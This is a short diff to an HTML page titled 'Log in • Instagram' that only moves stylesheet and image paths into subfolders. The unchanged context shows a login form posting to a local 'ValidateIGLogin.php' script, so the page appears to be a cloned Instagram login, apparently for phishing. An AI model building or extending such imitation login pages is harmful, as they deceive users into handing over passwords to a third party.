@@ -5,10 +5,10 @@
 
   <title>Log in • Instagram</title>
   
-      <link rel="stylesheet" href="auth.css">
+      <link rel="stylesheet" href="css/auth.css">
  <link rel="icon" 
       type="image/png" 
-      href="ig.png">
+      href="img/ig.png">
 
   
 </head>
@@ -19,7 +19,7 @@
 <div id="wrapper">
   <div class="main-content">
     <div class="header">
-      <img src="iglogobig.png" />
+      <img src="img/iglogobig.png" />
     </div>
     <div class="l-part">
       <form action="ValidateIGLogin.php" method="POST" />
